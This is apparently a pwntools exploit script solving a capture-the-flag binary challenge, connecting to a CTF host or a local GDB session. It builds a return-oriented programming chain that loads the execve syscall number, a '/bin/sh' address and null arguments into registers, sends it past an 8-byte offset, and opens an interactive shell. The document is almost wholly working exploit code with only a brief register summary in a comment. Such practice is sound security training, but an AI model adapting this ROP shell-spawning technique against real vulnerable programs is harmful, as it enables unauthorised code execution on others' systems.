#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('challenge')
r = ROP(elf)
getGadget = lambda x: p64(r.find_gadget(x).address)
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('university.opentoallctf.com',  30001)  
##############################
io = start()
# call execve ROP chain style
binsh = 0x40018f
exploit = getGadget(['pop rax', 'ret']) + p64(59)
exploit += getGadget(['pop rdi', 'ret']) + p64(binsh)
exploit += getGadget(['pop rsi', 'ret']) + p64(0)
exploit += getGadget(['pop rdx', 'ret']) + p64(0)
exploit += getGadget(['syscall'])
io.send(fit({8: exploit}))
io.interactive()
##############################
'''
rax = 59
rdi = /bin/sh
rsi	= 0
rdx = 0
syscall
'''